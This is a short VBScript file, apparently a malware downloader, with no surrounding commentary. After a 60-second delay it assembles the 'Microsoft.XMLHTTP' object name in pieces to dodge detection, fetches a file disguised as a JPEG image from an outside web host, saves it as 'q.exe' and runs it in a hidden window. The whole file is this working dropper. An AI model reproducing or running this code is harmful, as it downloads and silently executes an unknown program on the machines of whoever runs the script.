Dim BD
Dim xml
WScript.Sleep(60000)
fgfrf = "MLHTT"
Set xml = CreateObject("Microsoft.X"+fgfrf+"P")
xml.Open "GET", "http://www.daytalker.de/pics/3.jpg", False
xml.Send
BD = xml.ResponseBody
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
C=C=C
BinaryStream.Open
BinaryStream.Write BD
BinaryStream.SaveToFile "q.exe", adSaveCreateOverWrite
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "q.exe", 0, false
